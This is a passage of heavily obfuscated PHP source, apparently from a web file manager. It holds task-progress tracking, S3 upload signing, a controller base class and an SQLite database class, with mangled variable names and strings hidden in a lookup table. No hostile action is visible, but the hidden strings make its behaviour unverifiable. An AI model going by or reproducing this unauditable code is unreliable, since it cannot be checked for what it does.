self::log($ÇçâÀ»¯[1818] . $œè¸‘³ê . $ÇçâÀ»¯[73] . $Ö×Æ¼ÉÑ); $Ğ¨€ ¨® = rtrim(TEMP_FILES, $ÇçâÀ»¯[8]); if (substr($œè¸‘³ê, 0, strlen($Ğ¨€ ¨®)) == $Ğ¨€ ¨®) { return; } if (substr($Ö×Æ¼ÉÑ, 0, strlen($Ğ¨€ ¨®)) == $Ğ¨€ ¨®) { return; } $ÎÂÀù›ú =& $this->task; $ÎÂÀù›ú[$ÇçâÀ»¯[1819]] = KodIO::transferType($ëáÂ½»ú, $…’éÖ¾¹); $this->update(); } public function updateAfter() { $êê Åş =& $_SERVER[óÔë„ú]; $ÍÈÊà‹– =& $this->task; if (!$ÍÈÊà‹–[$êê Åş[823]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($ÍÈÊà‹–[$êê Åş[1819]] == $êê Åş[1388]) { return; } self::updateTask($ÍÈÊà‹–); } private static function updateTask(&$ËÅûúµé) { $ØÎ²‘ =& $_SERVER[óÔë„ú]; if ($ËÅûúµé[$ØÎ²‘[1819]] == $ØÎ²‘[1266] || $ËÅûúµé[$ØÎ²‘[1819]] == $ØÎ²‘[110]) { if ($ËÅûúµé[$ØÎ²‘[1813]]) { $ËÅûúµé[$ØÎ²‘[1816]] = $ËÅûúµé[$ØÎ²‘[1815]] + $ËÅûúµé[$ØÎ²‘[1812]]; } } else { if ($ËÅûúµé[$ØÎ²‘[1819]] == $ØÎ²‘[1389]) { if ($ËÅûúµé[$ØÎ²‘[1813]] == $ØÎ²‘[1266]) { $ËÅûúµé[$ØÎ²‘[1816]] = $ËÅûúµé[$ØÎ²‘[1815]] + $ËÅûúµé[$ØÎ²‘[1812]] * 0.5; } else { if ($ËÅûúµé[$ØÎ²‘[1813]] == $ØÎ²‘[110]) { $ËÅûúµé[$ØÎ²‘[1816]] = $ËÅûúµé[$ØÎ²‘[1815]] + $ËÅûúµé[$ØÎ²‘[1811]] * 0.5 + $ËÅûúµé[$ØÎ²‘[1812]] * 0.5; } } } } $ËÅûúµé[$ØÎ²‘[1760]] = $ËÅûúµé[$ØÎ²‘[1816]] / $ËÅûúµé[$ØÎ²‘[823]]; if ($ËÅûúµé[$ØÎ²‘[1760]] > 0) { $¶Ó˜Ö¦İ = timeFloat() - $ËÅûúµé[$ØÎ²‘[1762]] - $ËÅûúµé[$ØÎ²‘[1765]]; $ËÅûúµé[$ØÎ²‘[1766]] = $¶Ó˜Ö¦İ * (1 - $ËÅûúµé[$ØÎ²‘[1760]]) / $ËÅûúµé[$ØÎ²‘[1760]]; } } public function addPath($¢Ù–äÜ®) { $¿˜áÅˆ× =& $_SERVER[óÔë„ú]; if (!$¢Ù–äÜ®) { return; } $‡…Âş¶ù =& $this->task; $¢Î©¢÷Ÿ = IO::infoWithChildren($¢Ù–äÜ®); $îîàßôÃ = $‡…Âş¶ù[$¿˜áÅˆ×[1820]] ? $‡…Âş¶ù[$¿˜áÅˆ×[1820]][$¿˜áÅˆ×[1821]] : 0; $‡…Âş¶ù[$¿˜áÅˆ×[1820]] = array($¿˜áÅˆ×[1821] => $îîàßôÃ + 1, $¿˜áÅˆ×[494] => $¢Î©¢÷Ÿ[$¿˜áÅˆ×[32]], $¿˜áÅˆ×[87] => $¢Î©¢÷Ÿ[$¿˜áÅˆ×[87]], $¿˜áÅˆ×[582] => $¢Î©¢÷Ÿ[$¿˜áÅˆ×[582]] ? $¢Î©¢÷Ÿ[$¿˜áÅˆ×[582]] : $¢Î©¢÷Ÿ[$¿˜áÅˆ×[87]]); if ($¢Î©¢÷Ÿ[$¿˜áÅˆ×[33]] == $¿˜áÅˆ×[230]) { $‡…Âş¶ù[$¿˜áÅˆ×[1126]] += 1; } else { $‡…Âş¶ù[$¿˜áÅˆ×[1126]] += $¢Î©¢÷Ÿ[$¿˜áÅˆ×[82]][$¿˜áÅˆ×[80]]; if ($¢Î©¢÷Ÿ[$¿˜áÅˆ×[193]]) { $‡…Âş¶ù[$¿˜áÅˆ×[1126]] += $¢Î©¢÷Ÿ[$¿˜áÅˆ×[82]][$¿˜áÅˆ×[81]] + 1; } } $‡…Âş¶ù[$¿˜áÅˆ×[823]] += $¢Î©¢÷Ÿ[$¿˜áÅˆ×[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($µÏôÆ’Ã) { } public function sourceAddHashEnd($Ìñ³æå) { } public function sourceAddFileStart($ºÈÒôˆÍ) { $¿åˆâ¼ =& $_SERVER[óÔë„ú]; $ô™‘ªøƒ =& $this->task; $ô™‘ªøƒ[$¿åˆâ¼[1811]] = $ºÈÒôˆÍ[$¿åˆâ¼[79]]; $ô™‘ªøƒ[$¿åˆâ¼[1809]] = $ºÈÒôˆÍ[$¿åˆâ¼[32]]; $ô™‘ªøƒ[$¿åˆâ¼[1128]] = $ºÈÒôˆÍ[$¿åˆâ¼[32]]; $ô™‘ªøƒ[$¿åˆâ¼[1822]] = $ºÈÒôˆÍ[$¿åˆâ¼[87]]; $this->update(); } public function sourceAddFileEnd($›ËÕ˜ÀÆ) { $ïÚŒ‰â =& $_SERVER[óÔë„ú]; $ığŸûŸ¢ =& $this->task; $ığŸûŸ¢[$ïÚŒ‰â[1816]] += $›ËÕ˜ÀÆ[$ïÚŒ‰â[79]]; $ığŸûŸ¢[$ïÚŒ‰â[1822]] = $›ËÕ˜ÀÆ[$ïÚŒ‰â[87]]; $this->update(1); } public function copyFileStart($Ü‰Øá×à, $åò›Ä—ô, $ÓŸ›‡‘½, $ÎåíÜ£Å, $•¡Œè°›, $†¦»­·æ) { $¤×ØÆ’ =& $_SERVER[óÔë„ú]; $Ø¥™ô–Ö = $•¡Œè°›; if ($Ø¥™ô–Ö == $GLOBALS[$¤×ØÆ’[1823]]) { $Ø¥™ô–Ö = $GLOBALS[$¤×ØÆ’[1824]]; } $GLOBALS[$¤×ØÆ’[1824]] = $•¡Œè°›; $GLOBALS[$¤×ØÆ’[1823]] = $†¦»­·æ; $úÏï©Ü =& $this->task; $úÏï©Ü[$¤×ØÆ’[1809]] = $Ø¥™ô–Ö; $úÏï©Ü[$¤×ØÆ’[1811]] = (int) $Ü‰Øá×à->size($åò›Ä—ô); $úÏï©Ü[$¤×ØÆ’[1812]] = 0; $úÏï©Ü[$¤×ØÆ’[1128]] = $¤×ØÆ’[12]; $úÏï©Ü[$¤×ØÆ’[1813]] = $¤×ØÆ’[12]; $úÏï©Ü[$¤×ØÆ’[1814]] = 0; $­Ö’›¢Ø = $úÏï©Ü[$¤×ØÆ’[1811]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($úÏï©Ü[$¤×ØÆ’[475]] . $¤×ØÆ’[1825]); if ($­Ö’›¢Ø && file_exists(get_path_father($ÎåíÜ£Å))) { Cache::set($úÏï©Ü[$¤×ØÆ’[475]] . $¤×ØÆ’[1825], $ÎåíÜ£Å); $úÏï©Ü[$¤×ØÆ’[1782]] = array($¤×ØÆ’[1826], $¤×ØÆ’[1827]); } $this->update(0, $­Ö’›¢Ø); } public static function updateCopyLocalFileSize($µËÈ£ù) { $¦å„°Îœ =& $_SERVER[óÔë„ú]; $®è¼Ìğ = Cache::get($µËÈ£ù[$¦å„°Îœ[475]] . $¦å„°Îœ[1825]); if (!$®è¼Ìğ || !file_exists($®è¼Ìğ)) { return $µËÈ£ù; } $µËÈ£ù[$¦å„°Îœ[1812]] = @filesize($®è¼Ìğ); $µËÈ£ù[$¦å„°Îœ[1816]] += $µËÈ£ù[$¦å„°Îœ[1812]]; self::updateTask($µËÈ£ù); return $µËÈ£ù; } public function copyFileEnd($ë¨ı½“«, $ˆöäâşç, $ê¯ÓŠ–ª, $Àì®Š¡Ñ, $£Üğòì´, $çÍ÷îÒš) { $í‰‡‡¥½ =& $_SERVER[óÔë„ú]; $©„µá±ú =& $this->task; $©„µá±ú[$í‰‡‡¥½[1812]] = $©„µá±ú[$í‰‡‡¥½[1811]]; $©„µá±ú[$í‰‡‡¥½[1813]] = $í‰‡‡¥½[12]; unset($©„µá±ú[$í‰‡‡¥½[1782]]); if ($£Üğòì´ == $©„µá±ú[$í‰‡‡¥½[1809]]) { $©„µá±ú[$í‰‡‡¥½[1815]] += $©„µá±ú[$í‰‡‡¥½[1811]]; $©„µá±ú[$í‰‡‡¥½[1816]] = $©„µá±ú[$í‰‡‡¥½[1815]]; $²Ì÷ÒÚ· = 1; if (isset($©„µá±ú[$í‰‡‡¥½[1822]]) && $©„µá±ú[$í‰‡‡¥½[1822]] == $ˆöäâşç) { $²Ì÷ÒÚ· = 0; } $this->update($²Ì÷ÒÚ·); } else { $this->update(); $©„µá±ú[$í‰‡‡¥½[1812]] = 0; } Cache::remove($©„µá±ú[$í‰‡‡¥½[475]] . $í‰‡‡¥½[1825]); self::log($í‰‡‡¥½[1828] . $ˆöäâşç . $í‰‡‡¥½[73] . $Àì®Š¡Ñ . $í‰‡‡¥½[262] . $£Üğòì´ . $í‰‡‡¥½[1829] . $©„µá±ú[$í‰‡‡¥½[1809]]); } public function updateFileEnd($á•üÃÙ, $”Ä¤ĞÊ‰) { $ë¨ÀÖéÂ =& $_SERVER[óÔë„ú]; $á‚äë¦ =& $this->task; $á‚äë¦[$ë¨ÀÖéÂ[1809]] = $á•üÃÙ; $á‚äë¦[$ë¨ÀÖéÂ[1811]] = $”Ä¤ĞÊ‰; $á‚äë¦[$ë¨ÀÖéÂ[1815]] += $”Ä¤ĞÊ‰; $á‚äë¦[$ë¨ÀÖéÂ[1816]] = $á‚äë¦[$ë¨ÀÖéÂ[1815]]; $this->update(1); self::log($ë¨ÀÖéÂ[1830] . $á•üÃÙ); } public function sourceModelCopy($ÍŒá¸¬) { $—ÏÑÆ±ë =& $_SERVER[óÔë„ú]; $˜¸®ê™¸ = $ÍŒá¸¬[0]; $™Àô‚©¿ = $ÍŒá¸¬[1]; $ŒÈ”øµµ =& $this->task; $this->sourceModelCopyFlag = !0; $õã»§õ„ = 0; switch ($˜¸®ê™¸) { case $—ÏÑÆ±ë[635]: $õã»§õ„ = 1; break; case $—ÏÑÆ±ë[638]: $ŒÈ”øµµ[$—ÏÑÆ±ë[1809]] = $™Àô‚©¿[$—ÏÑÆ±ë[32]]; break; case $—ÏÑÆ±ë[640]: $õã»§õ„ = intval($ÍŒá¸¬[$—ÏÑÆ±ë[456]] * 0.4); break; case $—ÏÑÆ±ë[642]: $õã»§õ„ = intval($ÍŒá¸¬[$—ÏÑÆ±ë[456]] * 0.2); break; case $—ÏÑÆ±ë[644]: $õã»§õ„ = intval($ÍŒá¸¬[$—ÏÑÆ±ë[456]] * 0.4); break; } $this->update($õã»§õ„); $this->sourceModelCopyFlag = !1; } public function sourceRemove($öà¨õÙç, $•Ò’¼ƒ) { $Ù×Éù÷õ =& $_SERVER[óÔë„ú]; $this->sourceModelCopyFlag = !0; $Ù‘ƒÙ§ø = 1; if (isset($öà¨õÙç[$Ù×Éù÷õ[82]])) { $Ù‘ƒÙ§ø = $öà¨õÙç[$Ù×Éù÷õ[82]][$Ù×Éù÷õ[80]]; $Ù‘ƒÙ§ø = $Ù‘ƒÙ§ø + $öà¨õÙç[$Ù×Éù÷õ[82]][$Ù×Éù÷õ[81]] + 1; } $this->update($Ù‘ƒÙ§ø); $this->sourceModelCopyFlag = !1; } public function sourceMove($†……‘é­) { $this->sourceRemove($†……‘é­, !1); } public function curlProgress($œ®åÊæÇ, $˜‘†§ı‚, $”¦êü›º, $»Ã¨Ïğ¯, $–å·æö) { $–ÍÛş¾Ë =& $_SERVER[óÔë„ú]; $…Ù¶ò¬ =& $this->task; if ($–å·æö > 0) { $…Ù¶ò¬[$–ÍÛş¾Ë[1128]] = $–ÍÛş¾Ë[1831]; $…Ù¶ò¬[$–ÍÛş¾Ë[1813]] = $–ÍÛş¾Ë[110]; if ($…Ù¶ò¬[$–ÍÛş¾Ë[1811]]) { $…Ù¶ò¬[$–ÍÛş¾Ë[1812]] = $–å·æö; } if ($…Ù¶ò¬[$–ÍÛş¾Ë[1814]]) { $…Ù¶ò¬[$–ÍÛş¾Ë[1812]] = $–å·æö + $…Ù¶ò¬[$–ÍÛş¾Ë[1814]]; } } else { if ($”¦êü›º > 0) { if ($…Ù¶ò¬[$–ÍÛş¾Ë[1811]] == $˜‘†§ı‚) { $…Ù¶ò¬[$–ÍÛş¾Ë[1812]] = $”¦êü›º; $…Ù¶ò¬[$–ÍÛş¾Ë[1128]] = $–ÍÛş¾Ë[1832]; $…Ù¶ò¬[$–ÍÛş¾Ë[1813]] = $–ÍÛş¾Ë[1266]; } } } $this->update(); } public function curlProgressStart($˜£öÈÕÄ) { } public function curlProgressEnd($ÏÁÖÔ¼) { $‚šìÔ²Ã =& $_SERVER[óÔë„ú]; $‘£‚»€ =& $this->task; $—Â’Š›¬ = curl_getinfo($ÏÁÖÔ¼); $È¥›²¥û = $—Â’Š›¬[$‚šìÔ²Ã[1833]]; if ($È¥›²¥û == -1) { $È¥›²¥û = $—Â’Š›¬[$‚šìÔ²Ã[1834]]; } if ($‘£‚»€[$‚šìÔ²Ã[1813]] == $‚šìÔ²Ã[110] && $È¥›²¥û) { $‘£‚»€[$‚šìÔ²Ã[1814]] += $È¥›²¥û; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $–Ë‰î½Š =& $_SERVER[óÔë„ú]; $““Ç¢½ =& $this->task; $““Ç¢½[$–Ë‰î½Š[1835]] = 1; Hook::bind($–Ë‰î½Š[1803], array($this, $–Ë‰î½Š[1836])); Hook::bind($–Ë‰î½Š[1805], array($this, $–Ë‰î½Š[1837])); Hook::bind($–Ë‰î½Š[1807], array($this, $–Ë‰î½Š[1838])); } protected function endAfter() { $¤ôÜŠ‚™ =& $_SERVER[óÔë„ú]; Hook::unbind($¤ôÜŠ‚™[1803], array($this, $¤ôÜŠ‚™[1836])); Hook::unbind($¤ôÜŠ‚™[1805], array($this, $¤ôÜŠ‚™[1837])); Hook::unbind($¤ôÜŠ‚™[1807], array($this, $¤ôÜŠ‚™[1838])); } public function progressStart($â«Ëœ) { $ßÙ¨ë–® =& $_SERVER[óÔë„ú]; $¿ÑÕúİ = curl_getinfo($â«Ëœ); self::log($ßÙ¨ë–®[1839] . $¿ÑÕúİ[$ßÙ¨ë–®[383]]); self::valueSet($this->task[$ßÙ¨ë–®[475]], $this->task); } public function progressEnd($Ğ€¢ãıê) { $åÍ’Ù¬š =& $_SERVER[óÔë„ú]; self::log($åÍ’Ù¬š[1840] . $this->task[$åÍ’Ù¬š[475]]); $this->end(); } public function progress($¥œŞñû, $‹×Ôú«ù, $¸§Æ™Òæ, $Ö—œ‡³, $ĞÄ†­öË) { $ØÅ¬™²ğ =& $_SERVER[óÔë„ú]; $İ¾Ø¨ûı =& $this->task; if ($ĞÄ†­öË > 0) { $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]] = $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]] == 0 ? $Ö—œ‡³ : $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]]; $İ¾Ø¨ûı[$ØÅ¬™²ğ[1759]] = $ĞÄ†­öË; } else { if ($¸§Æ™Òæ > 0) { $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]] = $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]] == 0 ? $‹×Ôú«ù : $İ¾Ø¨ûı[$ØÅ¬™²ğ[1126]]; $İ¾Ø¨ûı[$ØÅ¬™²ğ[1759]] = $¸§Æ™Òæ; } } $this->update(); self::log("\x70\162\x6f\x67\162\145\x73\163\110\x74\x74\160\72\144\157\167\156\72{$¸§Æ™Òæ}\57{$‹×Ôú«ù}\x3b\40\165\160\x6c\x6f\x61\x64\72{$ĞÄ†­öË}\x2f{$Ö—œ‡³}\73"); } } goto D¯ğ Ñˆ² ; B˜¼®”Õå“: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($ß±Á‚¡Ã) { parent::__construct($ß±Á‚¡Ã); } public function uploadFormData($†ôô‰ä¯, $Ë‘÷Îå¼ = 3600) { $à¬áãı‡ =& $_SERVER[óÔë„ú]; $ßõê™Ä¯ = $à¬áãı‡[229]; $ÎÅì†âÛ = $à¬áãı‡[270]; $ïùôÃƒ = $à¬áãı‡[62]; $åÜæ¿Çƒ = gmdate($à¬áãı‡[271]); $àû·³Œ¡ = gmdate($à¬áãı‡[272]); $Àº Ò´ö = $à¬áãı‡[273]; $Ø¦ò×ÓÎ = $Ë‘÷Îå¼ . $à¬áãı‡[12]; $ò¶€¼Ï€ = $à¬áãı‡[274]; $ÅÍú†È¿ = array($this->accessKey, $àû·³Œ¡, $this->region, $ïùôÃƒ, $Àº Ò´ö); $‚Ä¥±¨ = implode($à¬áãı‡[8], $ÅÍú†È¿); $´öí«»Ø = array($à¬áãı‡[275] => gmdate($à¬áãı‡[299], strtotime($à¬áãı‡[277])), $à¬áãı‡[278] => array(array($à¬áãı‡[279] => $this->bucket), array($à¬áãı‡[280] => $ßõê™Ä¯), array($à¬áãı‡[281], $à¬áãı‡[282], $à¬áãı‡[12]), array($à¬áãı‡[281], $à¬áãı‡[283], $à¬áãı‡[12]), array($à¬áãı‡[281], $à¬áãı‡[284], $à¬áãı‡[12]), array($à¬áãı‡[285] => $ò¶€¼Ï€), array($à¬áãı‡[286] => $‚Ä¥±¨), array($à¬áãı‡[287] => $ÎÅì†âÛ), array($à¬áãı‡[288] => $åÜæ¿Çƒ), array($à¬áãı‡[289] => $Ø¦ò×ÓÎ))); $Åøö¶ü  = base64_encode(json_encode($´öí«»Ø)); $öâÆÖ½ = hash_hmac($à¬áãı‡[290], $àû·³Œ¡, $à¬áãı‡[291] . $this->secret, !0); $­¸úŠã‘ = hash_hmac($à¬áãı‡[290], $this->region, $öâÆÖ½, !0); $‰û£è…é = hash_hmac($à¬áãı‡[290], $ïùôÃƒ, $­¸úŠã‘, !0); $¿®ßñ—ª = hash_hmac($à¬áãı‡[290], $Àº Ò´ö, $‰û£è…é, !0); $ Åúı³ = hash_hmac($à¬áãı‡[290], $Åøö¶ü , $¿®ßñ—ª); $åŠ€­µ = array($à¬áãı‡[246] => $à¬áãı‡[12], $à¬áãı‡[292] => $à¬áãı‡[12], $à¬áãı‡[280] => $ßõê™Ä¯, $à¬áãı‡[285] => $ò¶€¼Ï€, $à¬áãı‡[293] => $Åøö¶ü , $à¬áãı‡[294] => $‚Ä¥±¨, $à¬áãı‡[295] => $ÎÅì†âÛ, $à¬áãı‡[296] => $åÜæ¿Çƒ, $à¬áãı‡[297] => $Ø¦ò×ÓÎ, $à¬áãı‡[298] => $ Åúı³, $à¬áãı‡[208] => $this->getHost()); return $åŠ€­µ; } public function multiUploadFormData($øú½èúõ, $–£Î¥º = 3600) { $â×÷âğˆ =& $_SERVER[óÔë„ú]; $áÑŒ€”– = gmdate($â×÷âğˆ[300]); $öÙÚ¯œ€ = array(); $ââ¿ü×¸ = $this->client->getUploadId($this->bucket, $øú½èúõ, $öÙÚ¯œ€); if (!$ââ¿ü×¸) { return !1; } return array($â×÷âğˆ[254] => $ââ¿ü×¸, $â×÷âğˆ[208] => $this->getHost() . $â×÷âğˆ[8] . $this->pathEncode($øú½èúõ), $â×÷âğˆ[255] => $áÑŒ€”–, $â×÷âğˆ[97] => $øú½èúõ); } public function multiUploadAuthData($³ıµ˜Úó, $õ¸£¿·£ = array()) { $ÜèÊÜ¡ =& $_SERVER[óÔë„ú]; $€äÂîè = isset($õ¸£¿·£[$ÜèÊÜ¡[169]]) ? $õ¸£¿·£[$ÜèÊÜ¡[169]] : $ÜèÊÜ¡[12]; $ÂŸ‚˜Ú = $õ¸£¿·£[$ÜèÊÜ¡[97]]; unset($õ¸£¿·£[$ÜèÊÜ¡[97]]); if (isset($õ¸£¿·£[$ÜèÊÜ¡[256]])) { return $this->listUploadParts($ÂŸ‚˜Ú, $õ¸£¿·£); } $ïßäÁ¡» = array(); if (isset($õ¸£¿·£[$ÜèÊÜ¡[301]])) { $ïßäÁ¡»[$ÜèÊÜ¡[302]] = $õ¸£¿·£[$ÜèÊÜ¡[301]]; } $Í›×²Ç¨ = explode($ÜèÊÜ¡[210], $this->getHost()); $ª™´‰ƒ = array($ÜèÊÜ¡[303] => $Í›×²Ç¨[1], $ÜèÊÜ¡[304] => $ÜèÊÜ¡[12], $ÜèÊÜ¡[246] => $ÜèÊÜ¡[123], $ÜèÊÜ¡[292] => $õ¸£¿·£[$ÜèÊÜ¡[79]]); $ƒáæ¦¤É = $ÜèÊÜ¡[259]; $­ˆª’Ğ = $ÜèÊÜ¡[8] . $this->pathEncode($ÂŸ‚˜Ú) . $€äÂîè; $€âÕ«ê = $this->client->__getSignatureV4($ïßäÁ¡», $ª™´‰ƒ, $ƒáæ¦¤É, $­ˆª’Ğ); if (strpos($€äÂîè, $ÜèÊÜ¡[258]) === 0) { if (isset($ïßäÁ¡»[$ÜèÊÜ¡[302]])) { $ãüŞ¢í = $ïßäÁ¡»[$ÜèÊÜ¡[302]]; } else { if (isset($€âÕ«ê[$ÜèÊÜ¡[302]])) { $ãüŞ¢í = $€âÕ«ê[$ÜèÊÜ¡[302]]; } else { $ãüŞ¢í = hash($ÜèÊÜ¡[290], $ÜèÊÜ¡[12]); } } return array($ÜèÊÜ¡[265] => $€âÕ«ê[$ÜèÊÜ¡[265]], $ÜèÊÜ¡[302] => $ãüŞ¢í, $ÜèÊÜ¡[255] => $€âÕ«ê[$ÜèÊÜ¡[305]]); } return $€âÕ«ê[$ÜèÊÜ¡[265]]; } public function listUploadParts($—€¶Ğëı, $ËÎœûğ° = array()) { $Å°—îÎ¸ =& $_SERVER[óÔë„ú]; $Î•ú÷– = str_replace($Å°—îÎ¸[266], $Å°—îÎ¸[12], $ËÎœûğ°[$Å°—îÎ¸[169]]); $…âÁòİø = $this->client->listParts($this->bucket, $—€¶Ğëı, $Î•ú÷–); if (!$…âÁòİø) { return !1; } $ËÄª¦îğ = $Å°—îÎ¸[306]; foreach ($…âÁòİø as $§öµöú‰) { $ËÄª¦îğ .= $Å°—îÎ¸[307] . "\74\120\141\x72\x74\116\x75\155\x62\x65\162\76{$§öµöú‰[$Å°—îÎ¸[308]]}\74\x2f\x50\x61\162\x74\116\x75\155\x62\x65\x72\76\xa" . "\x3c\x45\x54\141\x67\76{$§öµöú‰[$Å°—îÎ¸[309]]}\74\57\105\x54\x61\x67\x3e\12" . $Å°—îÎ¸[310]; } $ËÄª¦îğ .= $Å°—îÎ¸[311]; $¡¹«µ§ = array(); $ÖïÌã¸ = explode($Å°—îÎ¸[210], $this->getHost()); $²‡¶İŸ = array($Å°—îÎ¸[303] => $ÖïÌã¸[1], $Å°—îÎ¸[246] => $Å°—îÎ¸[123], $Å°—îÎ¸[292] => strlen($ËÄª¦îğ)); $€“õİá = $Å°—îÎ¸[257]; $§ñ”ŞÒğ = $Å°—îÎ¸[8] . $this->pathEncode($—€¶Ğëı) . $ËÎœûğ°[$Å°—îÎ¸[169]]; $¯±â¿ù‡ = $this->client->__getSignatureV4($¡¹«µ§, $²‡¶İŸ, $€“õİá, $§ñ”ŞÒğ, $ËÄª¦îğ); return array($Å°—îÎ¸[265] => $¯±â¿ù‡[$Å°—îÎ¸[265]], $Å°—îÎ¸[255] => $¯±â¿ù‡[$Å°—îÎ¸[305]], $Å°—îÎ¸[267] => $…âÁòİø, $Å°—îÎ¸[302] => $¯±â¿ù‡[$Å°—îÎ¸[302]]); } public function link($Ö ªŞ¨, $¦Â”ğ»š = array()) { return parent::link($Ö ªŞ¨, $¦Â”ğ»š); } public function fileOut($¨¬³„Ë¨, $«¥ãö¤¯ = false, $ªÇÄÏİ  = false, $óÌ‰Ş« = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[óÔë„ú][312])) { return parent::fileOutServer($¨¬³„Ë¨, $«¥ãö¤¯, $ªÇÄÏİ , $óÌ‰Ş«); } parent::fileOut($¨¬³„Ë¨, $«¥ãö¤¯, $ªÇÄÏİ , $óÌ‰Ş«); } public function fileOutImage($ÖÌ…·çã, $Ã­ïã°í = 250) { if (strstr($this->endpoint, $_SERVER[óÔë„ú][312])) { return parent::fileOutImageServer($ÖÌ…·çã, $Ã­ïã°í); } parent::fileOutImage($ÖÌ…·çã, $Ã­ïã°í); } public function fileOutLink($Ø„âªë) { $‚ÁâË¢ø =& $_SERVER[óÔë„ú]; if (substr($Ø„âªë, 0, 7) == $‚ÁâË¢ø[313]) { $Ø„âªë = $‚ÁâË¢ø[314] . substr($Ø„âªë, 7); } header($‚ÁâË¢ø[175] . $Ø„âªë); die; } } define($_SERVER[óÔë„ú][315], 1); define($_SERVER[óÔë„ú][316], 2); goto AÛ’ÖÈ¬Ê; bŒÔ®Ë¾Ê: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $ÚˆşÙÜ’ =& $_SERVER[óÔë„ú]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$ÚˆşÙÜ’[6]] =& $config; $this->values[$ÚˆşÙÜ’[7]] =& $in; $this->tpl = TEMPLATE . MOD . $ÚˆşÙÜ’[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($ôû¯Ñ) { if (1 === func_num_args()) { $this->{$ôû¯Ñ} = new $ôû¯Ñ(); } else { $®—ö‰Õõ = new ReflectionClass($ôû¯Ñ); $²Œ¿ôÅ‘ = func_get_args(); array_shift($²Œ¿ôÅ‘); $this->{$ôû¯Ñ} = $®—ö‰Õõ->newInstanceArgs($²Œ¿ôÅ‘); } return $this->{$ôû¯Ñ}; } public function routeBind($”§ÈÜÙ‹, $¼œæ”É, $¢ëÇ‡Âó = 3) { $õÃù¦Ì× =& $_SERVER[óÔë„ú]; $Ã’ƒİ‘ = $this->in[$õÃù¦Ì×[9]]; $”§ÈÜÙ‹ = str_replace($õÃù¦Ì×[10], $õÃù¦Ì×[11], trim(trim($”§ÈÜÙ‹, $õÃù¦Ì×[8]), $õÃù¦Ì×[12])); if (!$”§ÈÜÙ‹ || count($Ã’ƒİ‘) <= $¢ëÇ‡Âó) { return !1; } $ğÓ¾ûÕé = !0; $‚ÛêÄ†Û = explode($õÃù¦Ì×[8], $”§ÈÜÙ‹); for ($¯ìÆ÷ŸÕ = 0; $¯ìÆ÷ŸÕ < count($‚ÛêÄ†Û); $¯ìÆ÷ŸÕ++) { if ($‚ÛêÄ†Û[$¯ìÆ÷ŸÕ] != $Ã’ƒİ‘[$¢ëÇ‡Âó + $¯ìÆ÷ŸÕ]) { $ğÓ¾ûÕé = !1; break; } } if (!$ğÓ¾ûÕé) { return; } call_user_func_array(array($this, $¼œæ”É), array()); } public function routeArgs($š¿ĞŠŠ = 3) { $ÌˆúàÒ¥ = $this->in[$_SERVER[óÔë„ú][9]]; if (count($ÌˆúàÒ¥) <= $š¿ĞŠŠ) { return array(); } $ñç¹¿Ÿ… = array(); for ($­¾áıûô = $š¿ĞŠŠ; $­¾áıûô < count($ÌˆúàÒ¥); $­¾áıûô += 2) { $ñç¹¿Ÿ…[$ÌˆúàÒ¥[$­¾áıûô]] = $ÌˆúàÒ¥[$­¾áıûô + 1]; $this->in[$ÌˆúàÒ¥[$­¾áıûô]] = $ÌˆúàÒ¥[$­¾áıûô + 1]; } return $ñç¹¿Ÿ…; } protected function assign($¸ò¿³ªş, $¥üÏà¶») { $this->values[$¸ò¿³ªş] = $¥üÏà¶»; } protected function display($èÚÖÜÓ) { ob_end_clean(); extract($this->values); require $this->tpl . $èÚÖÜÓ; } } class DbSqliteBase extends Db { public function __construct($²Å­—Ë¹ = '') { $–÷´éøş =& $_SERVER[óÔë„ú]; if (!extension_loaded($–÷´éøş[13])) { think_exception(think_lang($–÷´éøş[14]) . $–÷´éøş[15]); } if (!empty($²Å­—Ë¹)) { if (!isset($²Å­—Ë¹[$–÷´éøş[16]])) { $²Å­—Ë¹[$–÷´éøş[16]] = 438; } $this->config = $²Å­—Ë¹; if (empty($this->config[$–÷´éøş[17]])) { $this->config[$–÷´éøş[17]] = array(); } } } public function connect($å©¦·«ß = '', $Àµ™¹ôê = 0) { $êòÂ¸ì =& $_SERVER[óÔë„ú]; if (!isset($this->linkID[$Àµ™¹ôê])) { if (empty($å©¦·«ß)) { $å©¦·«ß = $this->config; } $ÓãÏ¿å = !empty($å©¦·«ß[$êòÂ¸ì[17]][$êòÂ¸ì[18]]) ? $å©¦·«ß[$êòÂ¸ì[17]][$êòÂ¸ì[18]] : $this->pconnect; $Îîêå…ò = $ÓãÏ¿å ? $êòÂ¸ì[19] : $êòÂ¸ì[20]; $this->linkID[$Àµ™¹ôê] = $Îîêå…ò($å©¦·«ß[$êòÂ¸ì[21]], $å©¦·«ß[$êòÂ¸ì[16]]); if (!$this->linkID[$Àµ™¹ôê]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$Àµ™¹ôê], 30000); if (1 != think_config($êòÂ¸ì[22])) { unset($this->config); } } return $this->linkID[$Àµ™¹ôê]; } public function free() { $this->queryID = null; } public function query($ãŞ“§Ï‘) { $€á—ä‚Û =& $_SERVER[óÔë„ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ãŞ“§Ï‘; if ($this->queryID) { $this->free(); } think_action_status($€á—ä‚Û[23], 1); think_status($€á—ä‚Û[24]); $this->queryID = sqlite_query($this->_linkID, $ãŞ“§Ï‘); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $ûùöŠ¨Ì = $this->getAll(); return $ûùöŠ¨Ì; } } public function execute($²õËˆ¸) { $©äø³ş =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if 